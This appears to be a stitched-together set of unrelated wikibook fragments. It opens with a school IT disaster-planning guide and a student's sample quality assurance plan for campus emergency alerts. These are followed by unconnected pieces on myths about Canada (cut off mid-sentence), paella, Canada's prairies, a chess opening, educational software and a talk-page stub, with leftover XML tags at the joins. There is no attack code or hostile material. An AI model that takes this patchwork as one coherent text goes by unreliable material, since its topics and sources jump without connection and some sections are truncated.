&quot;Actions you take to identify preventable and unavoidable disasters and to address what can be done to eliminate or reduce the likelihood of a disaster and/or its accompanying risks&quot;&lt;ref&gt;Forum Crisis Preparedness 2007, Crisis Preparedness Leadership for IT Disaster Recovery. Retrieved from http://www.cosn.org/Initiatives/ITCrisisPrep/ToolsandResources/PresentationsandWorkshops/tabid/4643/Default.aspx&lt;/ref&gt;


===Step One - Brainstorm:===

The first thing you do before you can prepare, is to brainstorm the possible disasters that pose a threat to your school. You have to think internally and externally, about man-made disasters and natural disasters. The Nonprofit Coordinating Committee of New York has a guide, &quot;Disaster Planning, Emergency Preparedness and Business Continuity.&quot; While the guide's focus is on business continuity, there are still a lot of guidelines that can be applied to a technology disaster plan. The guidelines they give for where to start thinking about possible disasters is divided into historical, geographic, human error, and physical:

:::Historical: What types of emergencies have occurred in the community, at your facility, or nearby? (for example, fire, natural :::disasters, accidents, utility, etc.)

:::Geographic: What can happen as a result of your location? (e.g., proximity to: flood-prone areas; hazardous material production, :::storage or use; major transportation routes; power plants, etc.)

:::Human Error: What emergencies might be caused by employees? Are employees trained to work safely? Do they know what to do in an :::emergency? Human errors can result from poor training and supervision, carelessness, misconduct, substance abuse, fatigue, etc.

:::Physical: What types of emergencies could result from the design or construction of the facility? Does the physical facility enhance :::safety? Consider the: physical construction of the office; the facilities for storing combustibles or toxins; hazardous processes or :::byproducts; lighting; evacuation routes and exits; shelter areas, etc.&lt;ref&gt;NonProfit Coordinating committee of New York, “Disaster Planning, Emergency Preparedness and Business Continuity.” Retrieved from http://www.npccny.org/info/disaster_plan.htm&lt;/ref&gt;


In addition to thinking about all those possibilities, you need to think about a disaster which prohibits access into your school for an unknown amount of time. You may not even be able to go in to retrieve your backed up files. Or you can enter the building to get your equipment, but then you need to remove it and bring it to another location. The idea in planning for a disaster is to plan for small problems as well as major disasters. When brainstorming, do not forget to plan for disasters that are not dramatic. A major natural disaster is not as likely as a power outage, a compromised system, or a network crash. It will not help you to always be prepared for major crises if you cannot handle weekly disasters. 


===Step Two - Assign a Team:===


If you are the only one that knows the disaster plan, and a disaster occurs when you are not there, the plan is useless. In a large organization, you will most likely be a part of a team creating the plan. Your component will be regarding the technology in the school, while someone else is in charge of the safety of the students, etc. There should be communication and cooperation between the team while creating the plan so that the plan is cohesive and possible. If you are the technology coordinator in a small school, you would not have a team. But, you should still make sure that there are people who know the ins and outs of the plan in case you are not there when disaster strikes.


When assigning your team, keep in mind that there needs to be a chain of command, so that in the case when the number one person is not there to place the plan in effect, the number two person can take charge and so on. If part of your plan is in techie language, it is very possible that you wasted your time writing your plan, because if no technical staff is available, it wont get implemented!

===Step Three - Risk Analysis:===


In CoSN's ‚&quot;Crisis Planning Brief,&quot; they say that after brainstorming, you need to perform a risk assessment/analysis, to ‚&quot;consider all possible threats and vulnerabilities and the consequences of each.&quot;&lt;ref&gt;Crisis Planning Brief, Crisis Preparedness Leadership for IT Disaster Recovery. Retrieved from http://www.cosn.org/Resources/ResourceLibrary/tabid/4189/id/19/Default.aspx&lt;/ref&gt;


Performing a Risk Assessment:&lt;ref&gt;http://www.cosn.org/Initiatives/ITCrisisPrep/ToolsandResources/DisasterPlanningRecovery/Mitigation/tabid/4510/Default.aspx&lt;/ref&gt;


&lt;nowiki&gt;* Analyze processes and functions deemed mission-critical.&lt;/nowiki&gt;

&lt;nowiki&gt;* Identify types of potential disasters and impact of each on mission-critical items.&lt;/nowiki&gt;

&lt;nowiki&gt;* Prioritize based on acceptable period of unavailability.&lt;/nowiki&gt;

&lt;nowiki&gt;* Chart the workflow, considering hardware, software, people and other resource &lt;/nowiki&gt; requirements for continued operations.



== '''Preparedness:''' ==


&quot;Consideration of worst-case scenarios and development of comprehensive plan for coordinated and effective response to any given disaster.&quot;&lt;ref&gt;Forum Crisis Preparedness 2007, Crisis Preparedness Leadership for IT Disaster Recovery. Retrieved from http://www.cosn.org/Initiatives/ITCrisisPrep/ToolsandResources/PresentationsandWorkshops/tabid/4643/Default.aspx&lt;/ref&gt;



===Step Four - Prepare and Write Plan:===


Now that you have brainstormed possible disasters, collected a team, and preformed a risk analysis, you need to actually write your plan. Your disaster plan should have three components: What to do to prepare for a disaster, what to do during the disaster, and what to do after the disaster. 


-Take preventive measures (based on brainstormed possibilities). Some examples: secure your data, back it up, back it up at a remote location, have off site office space, make multiple copies of the plan, and have the plan backed up off site too. (If the plan is caught in the disaster, not so useful!)


-Identify and list resources (hardware and software), operations and records. Go through and classify what is critical, important, and not so important. Regularly update these lists. 
Have lists for the major software vendors you can call in the time of need.&lt;ref&gt;Terrill, T. (2006) Technology on a Shoestring. A Survival Guide for Educators and other Professionals. New York and London. Teacher's College Press.&lt;/ref&gt; 


-Have a fireproof box that can hold sensitive and vital information.


-Communicate with partners who can help in the time of emergencies, such as consultants and local emergency agencies. Also, have lists of computer vendors, and computer rental companies in the area. 


-&quot;Have a list of contact numbers for people who would need to be contacted during an emergency. This list should be in the hands of multiple people and it should include everyone's number don't assume that you will have access to the Rolodex sitting on your desk or that your palm pilot will be working.&quot;&lt;ref&gt;Terrill, T. (2006) Technology on a Shoestring. A Survival Guide for Educators and other Professionals. New York and London. Teacher's College Press.&lt;/ref&gt; 



-Plan for worst case scenarios. For example, all regular communication lines are unavailable. Have a backup plan for communicating.


The Plan should be written clearly and organized very well. There should be detailed tasks that need to be completed and it should be broken down into sections. You do not want to put all this work into preparing your plan and then it doesn't get used because the plan is not clearly written and you are not around to explain it.

===Step Five - Practice:===


The plan needs to be reviewed and practiced regularly for the best results of quick recovery. In jobs people come and go, so make sure to keep reviewing so that new people can learn it too. Continuously check your backups to make sure they are reliable. The employees involved in the plan should know what they have the authority to do in times of disaster. The more you practice, prepare, review, and train the easier it will be to recover from a disaster. 


== '''Response:''' ==


&quot;Execution of the preparedness plan and management of the disaster.&quot;&lt;ref&gt;Forum Crisis Preparedness 2007, Crisis Preparedness Leadership for IT Disaster Recovery. Retrieved from http://www.cosn.org/Initiatives/ITCrisisPrep/ToolsandResources/PresentationsandWorkshops/tabid/4643/Default.aspx&lt;/ref&gt;



===Step Six - Implement Plan:===


When disaster strikes, you need to implement your plan. If you are not there, you need to have someone at the school who knows what to do. How does someone know when it is a disaster? This should be made clear in the training sessions. 


You need to stay calm during the disaster. When you need to communicate, speak fast but clearly and say the most important things. If communication is cut, implement the backup communication (indicated in plan) and be organized. 



== '''Recovery:''' ==


&quot;The aim of the recovery phase is to restore the affected area to its previous state&quot;&lt;ref&gt;http://en.wikipedia.org/wiki/Emergency_management&lt;/ref&gt;


The goal of recovery is to return to a regular school day as soon as possible. If it was a small disaster and it will only take a few hours to reload all the information back into the computers, (hopefully everything was backed up and the back up was not damaged) and the recovery time will be short. If it was a large disaster and the computers cannot be used for a few months, without a plan your school could be out for months and your information cannot be accessed during that time. But, if you have a plan, such as contacting a computer rental company and having your data backed up at a remote location, the rentals can keeping the school days running normally and you will have access to your information. If you have been forced to evacuate the building for an unknown amount of time, hopefully you have temporary space set up for classes to run and for the equipment to be brought there. As mentioned at the beginning of the chapter, there is no cookie-cut disaster plan. You just have to plan as well as you can and hopefully your plan can tackle any disaster.

===Tips:===


Don't think 'this won't happen to me.' Always be prepared.

Always update and review your records, your team, and your plan.

Practice, practice, practice. 

== '''Example Quality Assurance Plan (QAP)''' ==

===Introduction===

'''Introduction to the Plan (Choice of Scenario):'''

The company I intend to write a Quality Assurance proposal for will be for a university setting. I shall refer to the university throughout this proposal as University of X.  University of X has one of the largest campuses in the Nation. Security is always an issue, and the result of what dreadfully occurred on the campus of Virginia Polytechnic Institute and State University has and will for ever be a turning point for security measures on campuses nationwide. This proposal serves only as an example. I furthermore hope this information may be used in practicality to serve the better good to aid in supplying more efficient safety and security to students, faculty and staff.

The purpose of this plan is to provide a quality assurance method to assist local security and police officers with specific means to broadcast critical safety information in real-time to a large number of students, faculty and staff.  


'''Introduction of the Project for the Plan:'''

The project will involve researching available communications technologies and understanding the practicality of such devices and their means of transmitting and receiving information (data). Furthermore I will create an online survey and distribute it to Chiefs of Security at 25 comparable universities nation wide. The results of this survey will help me to compare security procedures and the uses of technology which are in practice by these universities. 
ADD PIC

'''Company Background:'''

The University was established in the early 1800’s and is nationally and internationally ranked. Though being a public institution, the out-of-state cost of tuition for graduates and undergraduates is one of the most expensive in the nation. The University enrolls over 36,000 students annually and employs over 10,000 faculty and staff. The campus is divided into two sections, South Campus and North Campus. Combined they measure over 1,400 acres (5.7 km²).

'''Areas for the Company to Improve (Strengths and Weaknesses):'''

The main area for improvement within University of X is within the Department of Security. The connection between campus security, local Police and Fire Departments needs to be defined. For the safety of students, faculty and staff, critical safety information needs to be supplied to these persons in real-time. There exist many different procedures and ways of doing so, though many different topics need to be taken into consideration. Such considerations are as follows:

•	Budget
•	Technology
•	User-ability of such technology
•	Practicality of such technology
•	Overall Quality Assurance of such technology
•	Efficiency 


===Scope===

'''Scope of the Plan:'''

To begin the project I need to appoint a team which will consist of five to six persons. This team will brainstorm and devise a series of thirty questions. The questions will then be placed into an online survey and then submitted to 15 Universities. When the universities Department of Security fills out the survey, the information is submitted in real time. At this point I will collaborate with one or more experienced Security officers to extrapolate the data. This data will allow me to know the types of security technology and methods which are used and set in place at different universities. 

While this plan will involve a great deal of research there will exist limitations. Such limitations may include but are not limited to:

•	Retrieving information regarding private security procedures.
•	Retrieving data from my survey and incorporating it prior to the end of this course.
•	Deciphering the data and collaborating with one or more campus security specialists.

'''Outline Quality Assurance issues and problems.  Determine what the problem includes and what it does not include.'''

There does not seem to exist a plausible method for distributing specific accurate information wirelessly and in real-time to a dense population. Technologies exist such as the Internet, Cell Phones, Text Messaging, and Digital/Analog Radio. For example: A mass email is sent to the entire campus population consisting of safety information pertaining to a possible hurricane warning. Some students may be in transit and may not be able to check their email. Therefore this process concludes to be partially non-effective. Another example: A Text Message was sent to the population of students pertaining to a water main which has broken. Some students may have their cellular devices on silent, or may not own a cellular device. Furthermore many students may not have subscribed to such a service allowing security to alert them via text messaging pertaining to campus wide safety alerts. 



'''Objectives of the QA Plan:'''

The primary objective of this Quality Assurance Plan (QAP) will be to provide statistical and comparative information to College and University Campus Security Departments Nationwide. The QAP is focused on one hypothetical University, though the data which I will provide will be used for practical purposes. This QAP will serve as the foundation for my project and I intend to build upon this idea up to and surpassing the completion of this course. 

'''Approach (outline the methodologies or work to be done):'''

The primary approach I will need to take is to devise a survey consisting of specific questions (open ended and closed) and to submit to several different educational institutions. The process is then dependent on the Institution to fill out the survey and to then submit it. I will be using a survey engine (Surveymonkey) which will allow me to obtain the data in real time as well as other options such as exporting data into Excel for quick review and comparisons. After most more then 50% of the institutions have filled out the survey and submitted it, I will then be able to review the data. This data will be reviewed by myself as well as A institution security officer professional. As far as disclosing the schools involved in this project, I am uncertain at this time that listing names is possible.

'''Purpose of the plan:'''

The purpose of this plan is to allow any number of educational institutions to analyze and learn many approaches regarding the ability to broadcast communications to students, faculty and staff on a campus-wide scale. Due to the nature of our world today, crime on campuses is inevitable. Natural disasters on campus are as well an issue. In order to broadcast a message in real-time campus wide, some new technology may need to be implemented. The overall conclusion and most cost effective method may be the use of cellular phones, and the requirement to list your number with the local security office. I hope to review alternative and possible more effective methods. The overall information from this QA Plan can serve as a foundation for institutions nationwide to become familiar with alternative means of distributing information wirelessly. 


===Plan===

'''Define the QA plan for the Company:'''

The Quality Assurance Plan (QAP) will assure educational institutions with the processes needed to disperse information quickly and accurately. This includes but is not limited to specific technological devices. This plan will also serve as a basis for allowing institutions nationwide to become familiar with alternative means of communications disbursing. 

'''Determine the process and procedures for your plan (design, development, implementation, maintenance, revisions):'''

The main part of the QAP will be the survey. The survey will consist of several questions which will hopefully be answered in a timely fashion. I may not be able to determine some data such as:
•	How many cell phones are on campus?
•	How many handheld PDA devices are on campus?
•	How many MP3 devices are on campus?

For the most part I feel it is plausible to assume in this day and age, over 95% of students, faculty and staff on campus own a cellular device.

'''Reviews (how will reviews be conducted):'''

The reviews will be conducted by myself and possibly someone with a significant background in campus security. The reviews will be for educational purposes only. I may take the data a step further and allow more professionals to analyze the data and allow constructive feedback. The simple notion I am aiming for is what alternative sources are available today which are cost effective and easily implemented. I will be conducting research via Internet to venture into the world of different types of wireless devices. This data will be included.


===Standards===

'''Define the standards for your organization (ISO, IEEE…etc)'''

'''List and identify the specific standards that you will use for the QA plan:'''

My organization(s) will be using the ISO/IEC 15408 standard for their new QA process. This standard is defined as Evaluation Criteria for Information Technology Security (Wikipedia, ISO ISO/IEC 1540).

'''Explain the methods and techniques that will be used to meet standards'''

While transmitting confidential information wirelessly, the standards set in place insure the correct method of doing so is accurate and safe. The methods and techniques may seem tedious, though will be proven effective. Information submitted campus wide needs to be overlooked by three Security personnel as well as the president of the institution. This insures the accuracy of the information being transmitted. If an emergency occurs, the approval of the president of the institution is only needed. The method for transmitting this information will be by:

•	Email
•	Cellular text messages (MMS, SMS)
•	CCTV (Closed Circuit Television)
•	Verbal announcements (via PA system)


 
'''Describe the procedures and explain the goals or purpose of procedures:'''

The procedures will ensure that accurate information is distributed effectively throughout a dense institutional population. The goals of this procedure will be to distribute accurate information with the correct approvals using sufficient technology and strategies. Having a universal means for broadcasting information is of severe need in many institutions. Thus allowing this QAP to strengthen their security procedures ad overall operations.

'''Describe the activities or tasks for each procedure:'''

The activities involved for my primary procedure for creating a survey will be to utilize a survey creation program and service called Surveymonkey. This will be an intricate process as I need to devise the right questions and take note of the length of the survey. Since the persons I will be asking to fill out the survey may be busy, I need to assure the questions are to the point, precise and will allow me to obtain the right information.

'''Explain when and how the activity will be executed, recorded, who will participate, reporting and follow-up for corrective action:'''

The activity will be executed by submitting a mass survey to the Department of Security at twenty-five different educational institutions. This activity will supply valuable information pertaining to security procedures. Security can be a life or death situation whereas implementing the standards which I have set within the QAP may or may not be applicable for some institutions. The goal as reiterated is to supply accurate information with hope to implement a set of standards and practices relating to that of distributing accurate information wirelessly to a set group within the institution.

'''Testing Activities:'''

One of the possible testing activities is to mentor the effectiveness of a newly implemented means for broadcasting information wirelessly and accurately within a given institution. This activity can allow trial and error data for other institutions who wish to implement the same or similar system. 

A second testing activity will be to privately test equipment which may be used in a practical situation. The only draw back here will be the funding to do so. This method may be a safer approach as performing mock trials is better then the possibility of risking life or death. 


===Documentation===

'''What type of documentation will be created to support management (user guides, computer system guides, interim reports, progress reports, final reports)'''

There will be several documents which will be created to support management. The most important document which will be created will be contingency plan guidelines. A troubleshooting guide for operating the equipment will as well be created. The technology is computer based, so understanding the operating system is a must and will be included within the ISO/IEC standards. For implementation purposes, there will be a final report which will be needed to fill out upon the completion of a security procedure. 


'''Explain how the documentation will be created, used and the guidelines and maintenance of the reports
'''
'''Contingency Plan guideline:''' This plan will list step-by-step the process necessary to carry out the correct action(s).
 '''Troubleshooting Guide:''' This guide will supply technical information for troubleshooting the central computer system and other technologies.
'''Final Report:''' This report will ensure the correct measures were taken and will be reviewed and analyzed for future reference. This data will also allow for the future development of my QAP.

'''Documentation for testing activities'''

The documentation for testing activities will be provided by the technical writer who is appointed to the QA Team. The step-by-step procedures and trial and error occurrences will be recorded by and filed appropriately. The information may or may not be included in the final phase of the QAP. 

===Measurements===

'''Purpose of Measurements'''

The purpose of the measurements will be to record the effectiveness of the new technology and implemented procedures. The process of distributing emergency information to a dense population in real-time can mislead people if the information is incorrect. These overall measurements will strengthen the QAP. 

'''Type of Measurements (example – calibration)'''

The main type of measurements I will be using will be calibration. This will allow me to review the before and after. This calibration will continue on a quarterly scale and will determine the effectiveness of the QAP. Following is a list of other applicable testing methods which may or may not be used:


'''Unit Testing:''' This testing will ensure the source code within the software used to launch mass information will work.

'''Functional testing:''' This testing will insure that all the functions of the software and product will operate according to the products advertised capabilities.

'''End-to-End testing:''' This type of testing may be used to mimic real life situation with regards to cellular, internet, intranet, and WiFi situations.

'''Regression testing:''' This type of testing will ensure the modification from a previous software or hardware was corrected.

'''
When and how Measurements will be used'''


The measurements will be used at the start of the QAP. Following, these measurements will continue on a quarterly scale. 

'''Reporting Measurements and checking for adequacy:'''

The QAP Team will assess and extrapolate the data from the testing measurements. The information will be used to strengthen the testing process. Errors will be corrected such as the shift from one type of computer hardware, or software to a more efficient type. 
Corrective Action Process
If there is an error within the trials or the QAP, this will be assessed and corrected by the QAP team. With this type of QAP, there are many errors which can default, though having a Team in place will hopefully catch these inefficiencies before they occur, or correct them immediately before the data is interrupted.

===Risk Management===

'''Type of Risk management plan, methodology, process, tools:''' 

The Risk Management Plan will include all known risks involved with the plan and will be created by the analysis team. The following six steps will be used to create the plan in full:

Define Risk Management, as it applies to your project
Identify the categories of risk 
List all of the types of risks which may occur 
Determine the likelihood of the risks occurring 
Calculate the impact on the project if risk does occur 
Rank the risks identified in order or priority (Method123, 2003)

Determining risk is a very difficult task and involves many different types of processes. Nonetheless risk management is a crucial part of a Quality Assurance Plan (QAP).
                                            

'''Procedures and methods to be used to identify and analyze the collected data to determine risk:'''

A system will be implemented which will record the amount of broadcasted transmissions from the Central Security Offices. This system will work to improve the quality of the newly implemented technology. I will be using a Risk Priority Number (RPN) to analyze the risk identified during the Failure Mode and Effects Analysis (FMEA). According to the following three rating scales will conclude tot the severity of a potential risk. 

Severity, which rates the severity of the potential effect of the failure. 

Occurrence, which rates the likelihood that the failure will occur. 

Detection, which rates the likelihood that the problem will be detected before it reaches the end-user/customer. 

The risk will then be calculate on a five point severity scale which will allow the true acknowledgement of the severity of the risk and the Analysis Team will then be able to correct the risk.

'''Determine the level of risk and tools used to manage risk in the project (risk matrix, risk mitigation plan:'''

When the Risk Priority Number (RPN) is identified and then used to determine the Failure Mode and Effects Analysis (FMEA), the collected data will be included into a final Risk Mitigation Plan. This plan will identify the severity of the risks, types of risks, and will address all possible solutions.

'''Describes the performance criteria for the analysis procedures:
'''
The project team will be involved in the analysis procedures. The data will be presented and the team will view the Matrix and the mitigation plan, as well as the survey answers. The types of pertinent technology will be discussed and a plan to implement it will be created. Section 7 concludes the performance criteria for the analysis procedures.

'''Corrective Action for Risks:'''

As issues arise such as possible software failure, hardware failure, or user error a Corrective Actions Plan will be created. This plan will include a detailed list of the problems and will have an associated number as well as an implementation date.

===Training===

'''Define and describe the training plans for the project:'''

The training plan will assure that all personnel are on the same level and understand how to effectively use the equipment as well as troubleshooting and error reporting. A training manual will be designed which will consist of procedures and troubleshooting chapters. 

'''Special training or certification that may be required to implement the plan:'''

There will not be any required certification though the following certifications are recommended:

•	Certified Software Quality Analyst (CSQA) 
•	Certified Software Tester (CSTE) 
•	Certified Software Project Manager (CSPM) 
•	COPC Registered Coordinator Training 
•	CBTL SM- 1 
•	CBQASM 
•	Six Sigma Black Belt 
•	Six Sigma Green Belt 
•	Accredited ITIL Foundation Course 
•	Foundation Certificate in ITSM
 
'''Training for the personnel:'''

All personnel within the Security Department will be trained on the Quality Assurance Plan. Troubleshooting and error reporting procedures will be included. 

'''Training process for corrective action and procedures (frequency of reports to management, plans for closeout activities to document lessons learned):'''

All staff will participate in error reporting and will contribute to the Bi-weekly Corrective Actions and Procedures Plan. This plan will consist of the problems that occurred and the corrective actions to take. The chosen committee will review this plan and upon approval the corrective actions will be implemented. 

===Analysis and Milestones===

'''Determine the milestones and process for overall corrective action:'''

The implemented technology will be monitored for a period of 12 months and all known issues will be recorded and transmitted real time to a central database. After 12 months, if all known software quarks and/or issues are not corrected and the issues do not lie in fault with the personnel, an alternative technology may be implemented which would start the QAP over at the beginning. 

===Results, Conclusion and Follow-Up===

'''Determine how results will be collected, reviewed, and list the different types of corrective action:'''

The results will be reviewed via a central database designed to retrieve data from the security offices with the implemented system. Each Security Office will have personnel who will be in charge of the troubleshooting and recording the issues. The types of possible corrective actions are as follow:

1.	Implement an entirely new system
2.	Use different wireless devices
3.	Change the training procedures
4.	Correct the issues and continue with current infrastructure

      <text xml:space="preserve">There are many myths about Canada or Canadians that are untrue or partially untrue. Many of these myths have to do with topics such as weather, culture and history.

== Common myths ==
'''Myth #1- Canadians do not have paved roads. ''' 

Canadians drive cars, ride bikes, walk and use public transit to get around, just as Americans do.  In some more rural areas, there are roads that are unpaved, but in most areas the roads are covered by asphalt.

 

'''Myth #2- Canada’s national sport is hockey'''

Canada actually has two national sports: ice hockey and lacrosse.  Lacrosse claims to have been a national sport of Canada far longer than hockey.  It is said that lacrosse was declared to be Canada's national sport in 1859, but no official record of that has ever been found&lt;ref&gt;&quot;A Short History of Lacrosse in Canada&quot;. Canadian Lacrosse Association. http://www.lacrosse.ca/Default.aspx?cid=83&amp;lang=1.&lt;/ref&gt;. In any event, it is worth noting that 1859 was eight years before Canada came into being as a nation.

In 1994, Bill C-121 made hockey the official Canadian winter sport and lacrosse became Canada’s official summer sport&lt;ref&gt;&quot;National Sports of Canada Act&quot;&lt;/ref&gt;. Although both sports are officially national sports, hockey is generally considered Canada’s most popular sport. Canadians also invented basketball in addition to hockey&lt;ref&gt;Bellis, Mary. &quot;History of Basketball - James Naismith.&quot; About.com: Inventors. About.com. 25 Mar 2009 &lt;http://inventors.about.com/library/inventors/blbasketball.htm&gt;&lt;/ref&gt;.


'''Myth #3- Canadian Policemen all dress in red.'''

Mounties wear red on special occasions, but are otherwise dressed in regular policing uniforms. The Royal Canadian Mounted Police (RCMP) is best known for its musical ride where policemen perform in costume. The RCMP is Canada’s national policing force that is employed by over 190 municipalities, 184 aboriginal communities and three of Canada’s international airports&lt;ref&gt;&quot;About the RCMP.&quot; Royal Canadian Mounted Police. 25 FEB 2009. Royal Canadian Mounted Police. 24 Mar 2009 &lt;http://www.rcmp-grc.gc.ca/about-ausujet/index-eng.htm&gt;.&lt;/ref&gt;.



'''Myth #4- All Canadians speak both official languages, English and French, and the words &quot;eh&quot; and &quot;aboot&quot; are commonly used by everyone.'''  

Some Canadians have an accent that consists of saying &quot;eh&quot; at the end of questions, but not all Canadians speak in the same way. Canada is a large country consisting of many cultures and languages. The most popular language in Canada is English followed by French, then Chinese. There are over 100 different languages spoken at home by Canadians. Not all Canadians speak French, just like not all Canadians speak English, although both are Canada’s official languages. A 2001 census reported that 9/10 Canadians speak either French or English at home, 59% of Canadians say that English is their mother-tongue (language spoken from childhood), while 23% of Canadians say that French is their mother tongue.&lt;ref&gt;http://canadaonline.about.com/cs/statistics/a/statslang.htm&lt;/ref&gt;
 

'''Myth #5- Canada is covered in several feet of snow all year round, and temperatures are always below freezing.'''

Although Canada does receive snow in the winter in most areas, highs above 30 degrees Celsius are often reached in the summer&lt;ref&gt;&quot;Climate and Weather in Canada : Trail Canada.&quot; Trail Canada. Perargo Media. 25 Mar 2009 &lt;http://www.trailcanada.com/canada/weather/&gt;.&lt;/ref&gt;. Canadian temperatures are extremely varied from location to location. The northern parts of Canada receive considerably more snow than cities closer to the United States border.

== Stereotypes from Canadian History ==
Cultures and people are often portrayed in stereotypical and frequently untrue ways, due to the fact that broad generalizations are often made, despite the fact that each person is different.  Many of the people belonging to each category did exhibit some or even all of the stereotypical traits at one time or another, but very few, if any, showed all of these traits all of the time.  Some of the most common misconceptions about historical people in Canada are listed below.

'''British:''' Inconsiderate brutes at some times, and at other times they are perfectly saintly &quot;good-guys.&quot;  Some textbooks portray the British settlers as either destroying the Indian way of life and culture and decimating the land, or being the heroic warriors who have gained territory or other assets for their glorious country.&lt;ref&gt;Cranny, Michael, Graham Jarvis, Garvin Moles, and Bruce Seney.Horizons: Canada Moves West. '1st ed'. Toronto, ON: Pearson Education Canada, Inc., 1999.&lt;/ref&gt;  In actuality, some were inconsiderate or brutish, perhaps by nature or because of the environment they were in, but the belief that these people had no respect for other cultures was more the fact that many felt their society to be superior to others. 
 
'''French:'''  People whose entire purpose is to ruin the plans of the British and to oppose their rule of North America.
 
'''Indians (First Nations)'''&lt;ref&gt;Francis, Daniel. National Dreams. illustrated. arsenal pulp press, 1997.&lt;/ref&gt;:  War-loving, sneaky, savage, innocent to the point that they were robbed of their land and furs by Europeans, cheated into trading luxurious furs for cheap and worthless trinkets and beads, heathens with no faith or religion, filthy, ferocious, superstitious peoples.
 
'''Metis:'''  Robbed of the buffalo by white settlers, when in fact they were also actively involved in the depletion

[[File:Paella 1719081168.jpg|right|thumb|400px|Mixed paella]]
'''Paella''' is a type of slow food. It takes at least two hours to make and should be savored over a long meal with family and friends. A paella meal in Spain has the same pacing as a Thanksgiving meal in the United States. However, many Spaniards cook paella every Sunday.

Paella originated in its modern form in the mid-19th century near lake Albufera, a lagoon near the eastern coast of Spain's Valencian region.&lt;ref name=&quot;Info about Paella on About.com&quot;&gt;[http://spanishfood.about.com/od/maincourses/a/paella.htm Info about Paella on About.com]&lt;/ref&gt;

Many non-Spaniards view paella as Spain's national dish. However, most Spaniards consider it to be a regional Valencian dish. Valencians, in turn, regard paella as one of their cultural symbols.

There are three widely known types of paella: Valencian paella, seafood paella and mixed paella; but there are many others as well. Valencian paella consists of white rice, green vegetables, meat, snails, beans and seasoning. Seafood paella replaces meat and snails with seafood and omits beans and green vegetables. Mixed paella is a free-style combination of meat, seafood, vegetables and sometimes beans.

Most paella chefs use calasparra&lt;ref name=&quot;DeliaOL&quot;&gt;[http://www.deliaonline.com/ingredients/rice,227,IN.html Delia Online - Rice]&lt;/ref&gt;&lt;ref name=&quot;tienda&quot;&gt;[http://www.tienda.com/reference/paellarice.html Tienda.com - Paella Rice]&lt;/ref&gt;or bomba&lt;ref name=&quot;tienda&quot;/&gt;rices for this dish. Other key ingredients include saffron and [[Cookbook:Olive Oil|olive oil]].

Paella has gained considerable popularity throughout most of the Spanish-speaking world and among Hispanics in the United States. It also enjoys moderate popularity throughout Western Europe.

      <text xml:space="preserve">The first province of the prairies was Manitoba.  It was created under the Manitoba act which made it a bilingual place where French and English were accepted as official languages.  The act created two official education systems: Roman Catholic and Protestant.  Most of Manitoba was populated by the Metis, who were discriminated by the government before Manitoba became a province. Many Metis were forced to sell their land or face imprisonment. 

== Bison ==
At one time, bison were plentiful in the prairies (prior to 1874-1875).  The impact the animal had on the prairies was enormous.  Bison fueled the economy because their hides created clothing but most importantly, bison meat was made into pemmican which was not only traded with the Hudson's Bay Company but supplied each place with enough food for the entire year.  From bison fueling the economy, bison also became the main industry in the prairies.  Bison had a strong impact on the prairies, which was apparent once the bison started to become extinct in the area.

== Climate ==
The main type of precipitation the prairie receives is known as convectional precipitation. Convectional precipitation is caused by convection currents in the atmosphere. When the air heats during the day, it expands and rises. It then meets cool air, which also warms, rises, and cools, creating a cloud of rain or hail, which falls back to Earth. Even though the dry prairies can use as much precipitation it can get, convectional precipitation is often unreliable because it's heavy and can damage crops and soil.

The southeast part of the prairies, near the Alberta-Saskatchewan border, is very dry. The driest area is known as the &quot;Palliser Triangle,&quot; named after Captain Palliser, who mapped British territory from Lake Superior to the Oregon Valley in an 1857-1860 expedition. The prairie in the northwest is moist enough to support ranching and agriculture, but never moist enough to support trees.  

In Canada, the provinces of: Alberta, Saskatchewan and Manitoba are commonly referred to as the prairies.  The land itself is filled with meadows and very few trees, but contains the natural vegetation of grasses and shrubs.  The prairies are the agricultural centre of Canada because of their very fertile soil, which has produced such goods as canola and wheat.

== Treaties ==
During 1870, Canada was looking for more land for European settlement and for Canadians to live on. The North-West Territories had no clearly defined border lines but the area was currently controlled by the Native people. The first negotiations for land were between W. Simpson, Indian Commissioner in the Department of Indian Affairs, and the Cree and Saulteaux. The first of many treaties to come was signed on August 3, 1874 which left the Native people with less than 60 percent of the land they originally had. Over the following years more treaties were to be signed. Native people were in the need for jobs after the treaty signings and depletion of the buffalo. The Metis were forced to learn to farm as a means of survival. Farming was aided by the government per the conditions of the treaties.

== Ecology ==
Ground squirrels, gophers, and prairie dogs are plentiful in this region.  Hawks, owls, and badgers are the predators of the gophers.  Deer and antelope have replaced the bison as the largest animals in this biome. Wild fowl are found in the region's many sloughs.
 
The natural vegetation of the grasslands includes several types of short grasses--sagebrush and cactus in the south, and some areas of long grasses.  Agriculture has completely destroyed some of the indigenous grasses.  Human activity has also led to wind erosion, although there is less wind erosion on the prairie today than during the 1930s.  At that time, much of the topsoil of the region was blown away after years of prolonged drought.The soil of this region are brown in colour and have a high mineral content.  Depending on the length of grasses, and so the amount of humus they would provide over many years, the soils will vary from light to dark brown.  The dark brown soil type is known as chernozem and is ideal for growing wheat and other grain crops.

White develops the Bishop so as to hinder Black's normal Dutch kingside formation by pinning the e-pawn. Black now has to choose to either drive the Bishop away or attempt to develop normally, without the help of ...e6. The usual ...Nf6 in Dutch formations can now be replied by Bxf6, foiling the usual setup.

[[File:Future Astronaut.jpg|left|300px]]
Educators and technologists have long held hope for technology to transform teaching and learning—to dramatically improve learning and reduce failure. In practice, much educational software has demonstrated little or no positive effect (see Overview). Educational software has tended to be behavioristic and didactic in which the software leads the student to correct answers. Constructivism, the prevailing learning theory for the past two decades, strongly suggests an alternative approach. In fact, this more student-centered approach using tool software, educational games, and simulations was found to lead to higher student achievement.

In this spirit, '''''Transformative Applications''''' explores several computer-based applications that help achieve the grail of transforming teaching and learning. In the pages that follow, there are a broad variety of applications. ''Phun'' is a physics animation system that captivates both children and adults. ''GeoGebra'' allows teachers and students to make animated connections between an abstract formula and the graph that it describes. ''Molecular Workbench'' aims to help young and old learn about the latest discoveries in molecular mechanics such as nanotechnology self-assembly. ''NetLogo'' is a classic agent-based simulation that models emergent phenomena in the sciences and social sciences. Some, like ''GIMP'' have been around many years, but it may still represent a powerful way to create and interact with still images. Some software is designed to transform learning in a narrow field in domains like the military and health care; ''Nerveblock Simulator'' is such an application designed to change how medical field learns new skills.

      <text xml:space="preserve">== a great printed textbook ==

This looks like the beginnings of a great book.
What do we need to do to turn this into a great printed textbook?

I see that some modules in this book come in 4 nearly-identical editions, such as
* [[Foundations of Education and Instructional Assessment/Edition 1/Table of Contents/Chapter 1/1.7.2]],
